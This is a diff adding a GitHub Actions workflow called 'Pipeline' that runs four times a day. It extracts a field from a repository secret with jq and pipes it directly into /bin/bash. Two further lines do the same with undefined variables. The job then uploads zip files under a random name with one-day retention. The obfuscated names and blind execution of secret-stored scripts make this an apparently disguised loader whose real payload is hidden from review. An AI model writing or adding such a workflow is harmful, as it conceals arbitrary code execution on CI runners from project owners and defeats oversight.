@@ -1,0 +1,28 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          x41: ${{ secrets.x41 }}
+        run: |
+          printf '%s' "$x41" | jq -r .kizm28541 | /bin/bash
+          printf '%s' "$f53695" | jq -r .wj169 | /bin/bash
+          echo $zmo4 | jq -r .rqz664 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: oeJ4QiJ8
+          path: "*.zip"
+          retention-days: 1
